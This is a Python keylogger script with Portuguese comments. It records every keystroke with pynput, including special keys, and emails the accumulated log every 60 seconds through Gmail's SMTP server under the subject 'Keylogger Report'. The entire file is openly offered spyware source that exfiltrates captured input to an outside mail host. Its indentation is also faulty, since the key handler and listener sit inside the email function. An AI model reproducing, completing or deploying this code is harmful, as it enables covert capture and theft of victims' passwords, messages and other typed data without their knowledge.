from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log=''

# Configurações do email
EMAIL_ADDRESS = "seu_email@gmail.com"
EMAIL_PASSWORD = "sua_senha" # Use uma senha de app se 2FA estiver ativado
EMAIL_SMTP_SERVER = "smtp.gmail.com"
EMAIL_SMTP_PORT = 465

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Keylogger Report'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS

        try:
            server = smtplib.SMTP_SSL(EMAIL_SMTP_SERVER, EMAIL_SMTP_PORT)
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
            server.quit()
            print("Email enviado com sucesso.")
            log = ""  # Limpa o log após o envio
        except Exception as e:
            print(f"Falha ao enviar email: {e}")

            # Agendar o próximo envio a cada 60 segundos
    Timer(60, enviar_email).start()

    def on_press(key):
        global log
        try: 
            # Se foi uma tecla normal
            log += key.char
        except AttributeError:
            # Se foi uma tecla especial
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.tab:
                log += " [TAB] "
            elif key == keyboard.Key.backspace:
                log += " [BACKSPACE] "
            elif key == keyboard.Key.esc:
                log += " [ESC] "
            else:
                log += f" [{key}] "

                # Inicia o keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        enviar_email()  # Inicia o envio periódico de emails
        listener.join()